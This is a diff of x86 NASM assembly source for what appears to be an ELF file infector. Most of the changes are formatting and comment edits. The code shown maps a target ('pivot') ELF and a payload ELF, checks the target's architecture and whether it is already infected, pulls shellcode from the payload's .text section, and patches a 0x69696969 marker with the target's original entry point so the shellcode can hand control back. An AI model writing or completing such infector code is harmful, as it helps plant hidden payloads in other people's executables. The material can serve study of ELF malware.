@@ -1,6 +1,7 @@
 %include "include/shared.s"
 			; optional TODO's lines: 106, 136, 258, 326
 			; todo's lines : 433
+; TODO : both files should be MAP_PRIVATE in mmap:
 STRUC	stat
 	before_size:	resb	20 	; the other elements don't really matter in this context, we just need
 	st_size: 	resd	1	; the st_size's offset, and the size of the structure
@@ -20,35 +21,35 @@ STRUC Elf32_Ehdr
 	e_phentsize:	resw	1
 	e_phnum:	resw	1
 	e_shentsize:	resw	1
-	e_shnum		resw	1
+	e_shnum:	resw	1
 	e_shstrndx:	resw	1
-	ENDSTRUC
+ENDSTRUC
 
-	STRUC Elf32_Shdr
-	sh_name		resd	1
-	sh_type		resd	1
-	sh_flags	resd	1
-	sh_addr		resd	1
-	sh_offset	resd	1
-	sh_size		resd	1
-	sh_link		resd	1
-	sh_info		resd	1
-	sh_addralign	resd	1
-	sh_entsize	resd	1
-	ENDSTRUC
+STRUC Elf32_Shdr
+	sh_name:	resd	1
+	sh_type:	resd	1
+	sh_flags:	resd	1
+	sh_addr:	resd	1
+	sh_offset:	resd	1
+	sh_size:	resd	1
+	sh_link:	resd	1
+	sh_info:	resd	1
+	sh_addralign:	resd	1
+	sh_entsize:	resd	1
+ENDSTRUC
 
-	STRUC Elf32_Phdr
-	p_type		resd	1
-	p_offset	resd	1
-	p_vaddr		resd	1
-	p_paddr		resd	1
-	p_filesz	resd	1
-	p_memsz		resd	1
-	p_flags		resd	1
-	p_align		resd	1
-	ENDSTRUC
+STRUC Elf32_Phdr
+	p_type:		resd	1
+	p_offset:	resd	1
+	p_vaddr:	resd	1
+	p_paddr:	resd	1
+	p_filesz:	resd	1
+	p_memsz:	resd	1
+	p_flags:	resd	1
+	p_align:	resd	1
+ENDSTRUC
 
-	section .bss
+section .bss
 	pivot_name:	resd 	1	; pivot file's name
 	pivot_fd:	resd 	1
 	pivot_size:	resd 	1
@@ -61,7 +62,7 @@ STRUC Elf32_Ehdr
 	shellcode:	resd 	1	; shellcode address is memorry
 	shellcode_size:	resd 	1
 
-	section .text
+section .text
 	global _start
 
 	_start:
@@ -181,14 +182,14 @@ next_map:
 	mov ebx, 1
 
 mmap_err:
-	push ERR_BAD_MMAP
+	push ERR_BAD_MMAP		; the return value
 	; ebx has a hint of what file failed to map
 	test ebx, ebx
 	je close_files			; elf failed -> nothing was mapped -> close files and exit
 	jmp unmap_elf			; pivot failed -> elf was mapped -> unmap elf, close files then exit
 
 after_mapping:
-	; next we have to check if both the target file and the payload are 32 but, if not then we exit
+	; next we have to check if both the target file and the payload are 32 bit little endian, if not we exit
 	push dword[pivot_data]
 	call is_target_elf		; returns -1 for false, 0 for true
 	test eax, eax			; is this a good file ?
@@ -200,7 +201,7 @@ after_mapping:
 	je checking_infection
 
 arch_err:
-	push ERR_NOT_TARGET
+	push ERR_NOT_TARGET		; the return value
 	jmp clean
 
 checking_infection:
@@ -222,6 +223,7 @@ checking_infection:
 	mov eax, [pivot_name]
 	push eax
 	call strlen
+
 	push eax
 	call print
 
@@ -236,16 +238,16 @@ checking_infection:
 
 extract_shellcode:
 
-	mov eax, [elf_data]
-	push eax
+	push dword[elf_data]
 	push shellcode_size
 	call find_shell 		; returns a pointer to the .text sections, and initializes
 					; the shellcode_size variable
 
 	test eax, eax			; shellcode == NULL ?
 	jne next
-	push ERR_NO_SHELL
+	push ERR_NO_SHELL		; the return
 	jmp clean
+
 next:
 	mov [shellcode], eax
 
@@ -253,7 +255,7 @@ patching:
 	push eax			; the shellcode address
 	push dword[shellcode_size]
 	push 0x69696969 		; the DOWRD to replace in the shellcode
- 	;push the entry point		; AKA the value we'd replace the above value with
+ 	; sending the shellcode entry point so we can replace that marker with it
 	mov eax, [pivot_data]
 	add eax, e_entry
 	push dword[eax]
